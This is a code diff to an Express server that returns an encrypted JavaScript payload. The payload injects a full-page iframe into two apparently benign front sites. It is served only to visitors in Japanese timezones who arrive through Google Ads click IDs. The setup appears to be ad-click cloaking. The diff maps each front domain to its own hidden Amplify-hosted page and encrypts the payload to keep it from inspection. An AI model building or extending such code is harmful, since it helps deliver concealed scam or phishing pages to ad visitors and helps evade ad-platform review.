@@ -9,7 +9,11 @@ const ENCRYPTION_KEY =
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-const ALLOWED_ORIGINS = new Set(["https://ayakotravel.agency", "https://zen-hawellness.life"]);
+// 1. Replaced the Set with a mapping object
+const ORIGIN_TO_IFRAME_MAP = {
+  "https://ayakotravel.agency": "https://main.d3l1xhhcu66kde.amplifyapp.com",
+  "https://zen-hawellness.life": "https://main.d3l1xhhcu66kde.amplifyapp.com/aomine.html",
+};
 
 const JAPANESE_TIMEZONES = new Set([
   "Asia/Tokyo",
@@ -63,22 +67,15 @@ function hasGclid(fullUrl) {
   }
 }
 
-/**
- * POST /timezone
- *
- * Body (JSON):
- *   { "timezone": "Asia/Tokyo", "fullUrl": "https://.../?gclid=..." }
- *
- * Responses:
- *   200 { payload: "<encrypted-string>" } — all checks passed
- *   400 { error: "..." }                  — validation / check failures
- *   403 { error: "Origin not allowed" }   — origin not whitelisted
- */
 app.post("/timezone", (req, res) => {
   const { timezone, fullUrl } = req.body || {};
-
   const origin = req.headers.origin;
-  if (!origin || !ALLOWED_ORIGINS.has(origin)) {
+
+  // 2. Look up the target iframe URL based on the origin
+  const targetIframeUrl = ORIGIN_TO_IFRAME_MAP[origin];
+
+  // If the origin isn't in our map, targetIframeUrl will be undefined
+  if (!origin || !targetIframeUrl) {
     return res.status(403).json({ error: "Origin not allowed" });
   }
 
@@ -94,17 +91,19 @@ app.post("/timezone", (req, res) => {
       .json({ error: "fullUrl is missing gclid parameter" });
   }
 
+  // 3. Pass the target URL into the buildPayload function
   const encrypted = encodeURIComponent(
-    CryptoJS.AES.encrypt(buildPayload(), ENCRYPTION_KEY).toString(),
+    CryptoJS.AES.encrypt(buildPayload(targetIframeUrl), ENCRYPTION_KEY).toString(),
   );
-  console.log("Popup Sent: " + fullUrl);
+  
+  console.log(`Popup Sent: ${fullUrl} (Served: ${targetIframeUrl})`);
   return res.status(200).type("text/plain").send(encrypted);
 });
 
-function buildPayload() {
+// 4. Update the function to accept the targetUrl parameter
+function buildPayload(targetUrl) {
   return `const iframe = document.createElement("iframe");
-iframe.src =
-  "https://main.d3l1xhhcu66kde.amplifyapp.com";
+iframe.src = "${targetUrl}";
 
 iframe.setAttribute(
   "allow",
